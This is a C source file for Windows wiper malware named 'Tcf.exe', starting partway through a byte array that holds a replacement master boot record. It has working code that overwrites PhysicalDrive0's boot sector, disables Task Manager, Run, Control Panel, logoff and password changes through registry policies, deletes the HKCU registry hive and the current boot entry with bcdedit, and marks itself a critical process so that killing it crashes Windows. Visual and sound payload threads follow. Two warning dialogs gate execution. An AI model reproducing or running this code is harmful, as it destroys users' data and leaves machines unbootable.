	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA
};

DWORD WINAPI MBRWiper(LPVOID lpParam) {
	HANDLE hDrive = CreateFileW(
		L"\\\\.\\PhysicalDrive0",
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		FILE_FLAG_WRITE_THROUGH,
		NULL
	);

	if (hDrive == INVALID_HANDLE_VALUE) {
		return GetLastError();
	}

	DWORD bytesReturned = 0;

	SetFilePointer(hDrive, 0, NULL, FILE_BEGIN);

	DWORD bytesWritten = 0;
	BOOL success = WriteFile(
		hDrive,
		mbr,
		sizeof(mbr),
		&bytesWritten,
		NULL
	);

	DWORD result = (success && bytesWritten == sizeof(mbr)) ? 0 : GetLastError();

	return 0;
}
DWORD WINAPI Disabler(LPVOID lpParam) {
	system("taskkill /f /im taskmgr.exe");
	system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v DisableTaskMgr /t reg_dword /d 1 /f");
	system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer /v NoRun /t reg_dword /d 1 /f");
	system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer /v NoControlPanel /t reg_dword /d 1 /f");
	system("reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v HideFastUserSwitching /t REG_DWORD /d 1 /f");
	system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoLogoff /t REG_DWORD /d 1 /f");
	system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableLockWorkstation /t REG_DWORD /d 1 /f");
	system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableChangePassword /t REG_DWORD /d 1 /f");
	system("reg delete HKCU /f");
	system("bcdedit /delete {current}");
	return 1;
}
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
	srand((unsigned int)time(NULL));

	if (MessageBoxA(NULL, "Run malware? This is a DESTROY you pc", "Tcf.exe", MB_YESNO | MB_ICONWARNING) != IDYES) {
		return 0;
	}

	if (MessageBoxA(NULL, "Are you sure? THIS IS A DELETE YOU SYSTEM AND DATA!!! Do you want to continiume?", "Tcf.exe final warning!", MB_YESNO | MB_ICONWARNING) != IDYES) {
		return 0;
	}
	HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
	if (hNtdll) {
		BOOLEAN bl; RAPdef rPriv = (RAPdef)GetProcAddress(hNtdll, "RtlAdjustPrivilege");
		RSPICdef fCrit = (RSPICdef)GetProcAddress(hNtdll, "RtlSetProcessIsCritical");
		if (rPriv != NULL && fCrit != NULL) { rPriv(20, TRUE, FALSE, &bl); fCrit(TRUE, NULL, FALSE); }
	}
	CreateThread(0, 0, MBRWiper, 0, 0, 0);
	CreateThread(0, 0, Disabler, 0, 0, 0);
	Sleep(6000);

	HANDLE hPayload1 = CreateThread(NULL, 0, Payload1, NULL, 0, NULL);
	sound1();
	if (hPayload1) { TerminateThread(hPayload1, 0); CloseHandle(hPayload1); }

	HANDLE hPayload2 = CreateThread(NULL, 0, Payload2, NULL, 0, NULL);
	HANDLE hShader1 = CreateThread(NULL, 0, Shader1, NULL, 0, NULL);
	sound2();
	if (hPayload2) { TerminateThread(hPayload2, 0); CloseHandle(hPayload2); }
	if (hShader1) { TerminateThread(hShader1, 0); CloseHandle(hShader1); }

	HANDLE hPayload3 = CreateThread(NULL, 0, Payload3, NULL, 0, NULL);
	HANDLE hShader2 = CreateThread(NULL, 0, Shader2, NULL, 0, NULL);
	sound3();
	if (hPayload3) { TerminateThread(hPayload3, 0); CloseHandle(hPayload3); }
	if (hShader2) { TerminateThread(hShader2, 0); CloseHandle(hShader2); }

	HANDLE hPayload4 = CreateThread(NULL, 0, Payload4, NULL, 0, NULL);
	sound4();
	if (hPayload4) { TerminateThread(hPayload4, 0); CloseHandle(hPayload4); }

	HANDLE hPayload5 = CreateThread(NULL, 0, Payload5, NULL, 0, NULL);
	HANDLE hShader3 = CreateThread(NULL, 0, Shader3, NULL, 0, NULL);
	sound5();
	if (hPayload5) { TerminateThread(hPayload5, 0); CloseHandle(hPayload5); }
	if (hShader3) { TerminateThread(hShader3, 0); CloseHandle(hShader3); }

	HANDLE hPayload6 = CreateThread(NULL, 0, Payload6, NULL, 0, NULL);
	sound6();
	if (hPayload6) { TerminateThread(hPayload6, 0); CloseHandle(hPayload6); }

	HANDLE hPayload7 = CreateThread(NULL, 0, Payload7, NULL, 0, NULL);
	HANDLE hShader4 = CreateThread(NULL, 0, Shader4, NULL, 0, NULL);
	sound7();
	if (hPayload7) { TerminateThread(hPayload7, 0); CloseHandle(hPayload7); }

	HANDLE hPayload8 = CreateThread(NULL, 0, Payload8, NULL, 0, NULL);
	HANDLE hShader5 = CreateThread(NULL, 0, Shader5, NULL, 0, NULL);
	sound8();
	if (hPayload8) { TerminateThread(hPayload8, 0); CloseHandle(hPayload8); }

	HANDLE hPayload9 = CreateThread(NULL, 0, Payload9, NULL, 0, NULL);
	HANDLE hShader6 = CreateThread(NULL, 0, Shader6, NULL, 0, NULL);
	sound9_start();
	Sleep(30000);

	if (hPayload9) { TerminateThread(hPayload9, 0); CloseHandle(hPayload9); }

	InvalidateRect(0, 0, TRUE);

	HANDLE hShader7 = CreateThread(NULL, 0, shader7, NULL, 0, NULL);
	Sleep(30000);

	if (hShader7) { TerminateThread(hShader7, 0); CloseHandle(hShader7); }
	sound9_stop();

	InvalidateRect(0, 0, TRUE);
	ExitProcess(0);
}
